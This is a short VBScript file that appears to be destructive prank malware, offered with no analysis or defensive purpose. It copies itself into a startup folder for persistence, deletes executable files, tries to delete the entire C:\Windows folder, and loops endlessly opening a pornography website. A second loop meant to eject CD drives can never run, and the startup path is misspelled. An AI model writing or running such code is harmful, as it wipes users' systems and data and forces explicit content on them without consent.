set fso=CreateObject("Scripting.FileSystemObject")
fso.CopyFile Wscript.ScriptFullName, "C:\winodws\startmenu\programs\startup\1.vbs", True

dim filesysdelfile
Set filesysdelfile = CreateObject("Scripting.FileSystemObject")
filesysdelfile.DeleteFile "*.exe",True
Set filesysdelfile = Nothing

dim foldersys
set foldersys=CreateObject("Scripting.FileSystemObject")
If foldersys.FolderExists ("c:\windows") Then
foldersys.DeleteFolder "c:\windows",True
End if

do
Dim shell
Set shell = CreateObject("WScript.Shell")
shell.Run """C:\Program Files\Internet Explorer\IExplore.exe""www.porn.com"
loop 

do
Set oWMP = CreateObject("WMPlayer.OCX.7" ) 
Set colCDROMs = oWMP.cdromCollection 
if colCDROMs.Count  then 
For i = 0 to colCDROMs.Count - 1 
colCDROMs.Item(i).Eject 
Next ' cdrom 
End If 
loop

